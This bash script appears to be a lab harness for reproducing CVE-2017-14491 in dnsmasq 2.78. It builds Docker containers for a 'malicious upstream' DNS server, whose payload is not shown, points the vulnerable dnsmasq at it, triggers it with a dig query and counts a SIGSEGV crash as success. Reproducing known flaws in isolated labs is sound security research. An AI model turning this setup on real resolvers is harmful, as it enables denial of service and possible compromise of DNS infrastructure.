#!/bin/bash
# Test CVE-2017-14491 in dnsmasq with malicious upstream

set -e

echo "=== CVE-2017-14491 dnsmasq test ==="

# Cleanup
docker rm -f dnsmasq-vuln dns-upstream 2>/dev/null || true
docker network rm dns-test-net 2>/dev/null || true

# Create network
docker network create dns-test-net

# Start malicious upstream DNS server
echo "[*] Starting malicious upstream DNS server..."
docker run -d --name dns-upstream --network dns-test-net \
    -v $(pwd)/malicious_upstream.py:/app/server.py \
    python:3.11-slim python /app/server.py

sleep 2

# Get upstream IP
UPSTREAM_IP=$(docker inspect dns-upstream --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "[*] Upstream IP: $UPSTREAM_IP"

# Create dnsmasq config pointing to malicious upstream
cat > /tmp/dnsmasq-vuln.conf << EOF
listen-address=0.0.0.0
port=53
no-resolv
server=$UPSTREAM_IP#5399
cache-size=0
log-queries
log-facility=-
EOF

# Start vulnerable dnsmasq
echo "[*] Starting dnsmasq 2.78..."
docker run -d --name dnsmasq-vuln --network dns-test-net \
    -p 5350:53/udp \
    -v /tmp/dnsmasq-vuln.conf:/etc/dnsmasq.conf:ro \
    dns-dnsmasq-2.78

sleep 2
docker logs dnsmasq-vuln

# Send query to trigger the vulnerability
echo "[*] Sending query to trigger CVE-2017-14491..."
dig @127.0.0.1 -p 5350 test.example.com +timeout=2 +tries=1 || true

sleep 2

# Check results
echo ""
echo "=== Results ==="
docker logs dns-upstream 2>&1 | tail -5
echo ""

STATUS=$(docker inspect dnsmasq-vuln --format='{{.State.Status}}')
EXIT=$(docker inspect dnsmasq-vuln --format='{{.State.ExitCode}}')
echo "dnsmasq status: $STATUS, exit: $EXIT"

if [ "$EXIT" = "139" ]; then
    echo "SUCCESS: dnsmasq crashed with SIGSEGV (exit 139)"
elif [ "$STATUS" = "exited" ]; then
    echo "dnsmasq exited with code $EXIT"
    docker logs dnsmasq-vuln 2>&1 | tail -10
else
    echo "dnsmasq still running (no crash)"
fi

# Cleanup
docker rm -f dnsmasq-vuln dns-upstream 2>/dev/null || true
docker network rm dns-test-net 2>/dev/null || true
